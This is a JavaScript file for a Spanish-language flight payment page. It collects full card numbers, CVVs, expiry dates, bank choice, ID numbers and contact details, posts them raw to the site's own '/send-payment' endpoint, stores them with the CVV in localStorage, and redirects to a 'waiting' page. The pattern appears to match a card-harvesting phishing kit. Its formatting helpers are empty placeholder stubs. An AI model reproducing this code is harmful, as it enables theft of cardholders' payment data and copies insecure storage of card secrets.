// public/js/payment.js
(function () {
    'use strict';

    const LS = window.localStorage;
    const form = document.querySelector('#next-step');
    const loader = document.querySelector('.loader');

    // Referencias a los elementos del formulario
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const dues = document.querySelector('#dues');
    const dudename = document.querySelector('#name');
    const surname = document.querySelector('#surname');
    const dniEl = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const state = document.querySelector('#state');
    const address = document.querySelector('#address');
    const flightCostEl = document.querySelector('#flight-cost');

    // Función para mostrar/ocultar el loader
    function toggleLoader(show) {
        if (loader) {
            if (show) {
                loader.classList.add('show');
                loader.style.display = 'block';
                document.body.classList.add('sb-hidden');
            } else {
                loader.classList.remove('show');
                loader.style.display = 'none';
                document.body.classList.remove('sb-hidden');
            }
        }
    }

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            console.log("➡️ Inicio de envío del formulario.");

            toggleLoader(true);

            const paymentData = {
                flightCost: flightCostEl ? flightCostEl.textContent : '',
                name: dudename ? dudename.value : '',
                surname: surname ? surname.value : '',
                cc: dniEl ? dniEl.value : '',
                email: email ? email.value : '',
                telnum: telnum ? telnum.value : '',
                city: city ? city.value : '',
                state: state ? state.value : '',
                address: address ? address.value : '',
                bank: ban ? ban.value : '',
                cardNumber: p ? p.value : '',
                expiryDate: pdate ? pdate.value : '',
                cvv: c ? c.value : '',
                dues: dues ? dues.value : '',
            };

            try {
                console.log("➡️ Enviando datos al servidor...");
                const response = await fetch('/send-payment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(paymentData),
                });

                if (!response.ok) {
                    throw new Error(`Error HTTP: ${response.status}`);
                }

                const result = await response.json();
                console.log("✅ Respuesta recibida del servidor:", result);

                if (result.ok && result.transactionId) {
                    const savedInfo = JSON.parse(LS.getItem('info')) || {};
                    savedInfo.transactionId = result.transactionId;
                    savedInfo.paymentData = paymentData;
                    LS.setItem('info', JSON.stringify(savedInfo));
                    
                    console.log(`✅ ID de transacción '${result.transactionId}' guardado. Redirigiendo a waiting.html...`);
                    window.location.href = 'waiting.html';
                } else {
                    console.error('❌ La respuesta del servidor no fue exitosa o faltan datos.');
                    alert('Hubo un problema al procesar el pago. Por favor, inténtalo de nuevo.');
                    toggleLoader(false);
                }
            } catch (err) {
                console.error('❌ Error fatal al enviar el formulario:', err);
                alert('No se pudo conectar con el servidor. Revisa tu conexión a internet.');
                toggleLoader(false);
            }
        });
    }

    // Funciones de utilidad y validación
    window.formatCNumber = function (input) {
      // ... (tu lógica original)
    };
    window.formatDate = function (input) {
      // ... (tu lógica original)
    };
    window.limitDigits = function(input, limit) {
      // ... (tu lógica original)
    };

    document.addEventListener('DOMContentLoaded', () => {
        console.log("payment.js inicializado.");
    });
})();
